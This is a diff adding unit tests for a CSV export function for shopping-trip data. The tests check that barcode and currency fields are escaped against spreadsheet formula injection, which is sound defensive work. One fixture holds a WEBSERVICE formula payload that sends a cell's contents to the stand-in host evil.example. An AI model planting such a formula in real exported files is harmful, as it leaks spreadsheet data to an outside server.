@@ -111,6 +111,30 @@ describe('tripsToCsv', () => {
 		expect(csv).toContain(",'-5% off,");
 	});
 
+	it('only writes a barcode of digits in the ="…" text form', () => {
+		// A barcode is any text a partner's phone synced, so it must not become a formula.
+		const csv = tripsToCsv([
+			{
+				trip,
+				store,
+				items: [item({ barcode: '"&WEBSERVICE("https://evil.example/?"&C2)&"' })]
+			}
+		]);
+		expect(csv.split('\r\n')[1]).toContain(
+			',Milk,"""&WEBSERVICE(""https://evil.example/?""&C2)&""",1,'
+		);
+		expect(csv).not.toContain('="');
+		const leading = tripsToCsv([{ trip, store, items: [item({ barcode: '=1+1' })] }]);
+		expect(leading.split('\r\n')[1]).toContain(",Milk,'=1+1,1,");
+	});
+
+	it('escapes the currency like any other text', () => {
+		const csv = tripsToCsv([
+			{ trip, store: { ...store, currency: '=1+1,"x"' }, items: [item({})] }
+		]);
+		expect(csv.split('\r\n')[1]).toContain(`,1,"'=1+1,""x""",1.45,`);
+	});
+
 	it('says nothing of pounds or VAT for a store with no currency', () => {
 		const csv = tripsToCsv([{ trip, store, items: [item({})] }]);
 		expect(csv).not.toMatch(/£|GBP|VAT/);
